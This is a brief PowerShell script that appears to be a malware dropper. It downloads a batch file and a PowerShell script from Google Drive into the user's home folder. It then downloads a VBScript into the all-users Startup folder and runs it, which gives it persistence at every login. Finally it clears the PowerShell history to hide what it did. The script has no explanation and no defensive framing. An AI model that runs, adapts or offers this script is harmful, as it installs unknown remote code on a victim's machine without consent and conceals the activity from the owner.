cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=11M4wy0arcs75l79I_ykCJUUiT0yQD8k6" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1JEyVqk9NEtt1ABMY6fIuAoQOfwiEaW0b" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=118vZIW6-WC1m1jNVkt7u5uqaB0bJ_QCi" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit
